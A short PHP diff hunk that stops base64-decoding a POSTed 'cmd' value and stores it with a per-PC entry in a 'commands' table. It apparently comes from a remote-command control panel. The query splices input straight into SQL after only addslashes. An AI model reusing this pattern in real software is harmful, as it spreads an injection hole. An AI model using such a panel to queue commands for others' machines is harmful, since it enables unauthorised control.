@@ -6,7 +6,7 @@ if(isset($_POST['cmd'])) {$cmd=addslashes(html_entity_decode($_POST['cmd']));}
 if(isset($_POST['id'])) {$id=addslashes(html_entity_decode($_POST['id']));}
 $result="";
 $ok="0";
-$cmd=base64_decode($cmd);
+
 mysqli_query($bdd, "INSERT INTO commands (`id`, `pc` , `cmd` , `result` , `ok`) VALUES ('', '$pc', '$cmd', '$result', '$ok')");
 mysqli_close($bdd); 
 ?>
